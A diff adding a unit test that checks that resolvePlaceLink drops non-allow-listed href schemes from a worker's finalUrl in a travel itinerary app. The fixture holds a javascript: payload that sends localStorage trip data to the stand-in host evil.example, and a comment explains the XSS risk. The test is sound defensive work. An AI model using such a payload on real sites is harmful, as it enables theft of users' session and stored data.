@@ -72,6 +72,25 @@ describe('resolvePlaceLink (S284) — never throws, degrades to null', () => {
     expect(requested).toEqual([`${ORIGIN}/resolve?url=${encodeURIComponent(URL)}`]);
   });
 
+  it('drops a finalUrl whose scheme is not in the href allow-list, keeping the rest of the hints', async () => {
+    // `finalUrl` is stored on the MyPlace and rendered as a live `<a href>`; `cleanStr`
+    // (trimmed-non-empty) was the ONLY filter, so a hostile/compromised Worker could hand the
+    // client a `javascript:` href on an origin with no CSP, a Firebase session and every trip key
+    // in localStorage. The name/coords are still usable, so only the URL is dropped.
+    const fetchImpl = (async () =>
+      jsonRes({
+        ok: true,
+        name: 'Fushimi Inari',
+        lat: 34.9671,
+        finalUrl: "javascript:fetch('https://evil.example/?'+localStorage.getItem('nepal_japan_itinerary'))",
+      })) as unknown as typeof fetch;
+    const hints = await resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN });
+    expect(hints).not.toBeNull();
+    expect(hints!.finalUrl).toBeUndefined();
+    expect(hints!.name).toBe('Fushimi Inari');
+    expect(hints!.lat).toBe(34.9671);
+  });
+
   it('returns null on a non-200 response (manual fallback)', async () => {
     const fetchImpl = (async () => jsonRes({}, false, 404)) as unknown as typeof fetch;
     expect(await resolvePlaceLink(URL, { fetchImpl, origin: ORIGIN })).toBeNull();
